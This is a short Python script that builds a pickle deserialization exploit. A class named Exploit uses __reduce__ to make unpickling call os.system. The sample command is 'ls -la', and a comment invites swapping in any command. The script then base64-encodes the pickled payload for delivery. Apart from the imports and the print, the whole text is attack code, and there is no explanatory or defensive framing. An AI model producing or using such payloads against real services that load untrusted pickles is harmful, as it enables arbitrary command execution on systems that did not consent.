import pickle
    import base64
    import os

    class Exploit:
        def __reduce__(self):
            return (os.system, ('ls -la',))  # Replace 'ls -la' with any command

    exploit = Exploit()
    pickled_data = pickle.dumps(exploit)
    encoded_data = base64.b64encode(pickled_data).decode()

    print(encoded_data)

